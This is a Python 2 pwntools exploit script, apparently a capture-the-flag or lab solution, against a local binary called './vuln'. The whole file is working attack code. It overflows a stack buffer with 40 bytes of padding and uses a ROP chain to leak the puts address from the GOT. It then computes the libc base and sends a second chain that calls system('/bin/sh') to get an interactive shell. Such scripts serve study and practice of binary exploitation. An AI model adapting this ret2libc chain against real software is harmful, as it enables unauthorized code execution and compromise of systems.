#!/usr/bin/env python2
from pwn import *
#context.log_level='DEBUG'

p = process("./vuln")
elf = ELF("./vuln", checksec=False)
libc = elf.libc
rop = ROP(elf)

def start():
	if not args.REMOTE:
		return process("./vuln")
	else:
		return remote("localhost", 1337)

p = start()

def main():

	global rop

	#pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
	pop_rdi = 0x00000000004011f3
	ret = 0x000000000040101a
	puts_got = elf.got['puts']
	puts_plt = elf.plt['puts']
	main = elf.symbols['main']

	payload = ""
	payload += "A"*40
	payload += p64(pop_rdi)
	payload += p64(puts_got)
	payload += p64(puts_plt)
	payload += p64(main)

	p.sendline(payload)

	p.recvline()
	p.recvline()

	leaked_puts = u64(p.recvline().strip().ljust(8, "\x00"))
	log.info("puts@leak: " + hex(leaked_puts))

	libc.address = leaked_puts - libc.symbols['puts']
	system = libc.symbols['system']
	bin_sh = next(libc.search("/bin/sh"))

	payload = ""
	payload += "A"*40
	payload += p64(ret)
	payload += p64(pop_rdi)
	payload += p64(bin_sh)
	payload += p64(system)

	p.sendline(payload)

	p.interactive()

if __name__=="__main__":
	main()
